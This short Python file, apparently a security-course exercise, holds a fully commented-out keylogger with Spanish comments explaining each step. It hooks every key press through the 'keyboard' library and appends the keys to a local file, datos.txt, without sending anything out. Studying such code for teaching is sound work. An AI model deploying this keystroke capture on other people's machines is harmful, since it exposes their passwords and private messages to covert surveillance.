# SI_T5_P1

# import keyboard #Importa la librería que detecta el teclado

# def teclaspulsadas(key): #Define la función teclas pulsadas con el parámetro key
    
#    with open('datos.txt', 'a') as file: #Abre el archivo datos.txt para alamcenar las teclas ahí. y la a añade texto para que no se sobrescriba.
        
#        if key.name == 'space': #Condicional que en resumen, si pulsas el espacio se imprime un blanco y si no la tecla pulsada. Ambos se escriben en el archivo con el file.write.

#            file.write(' ')
#        else:
#            file.write(key.name)

# keyboard.on_press(teclaspulsadas)  #Llama a la función cada vez que el usuario pulsa una tecla.

# keyboard.wait() #Hace que el programa se ejecute hasta que se pause.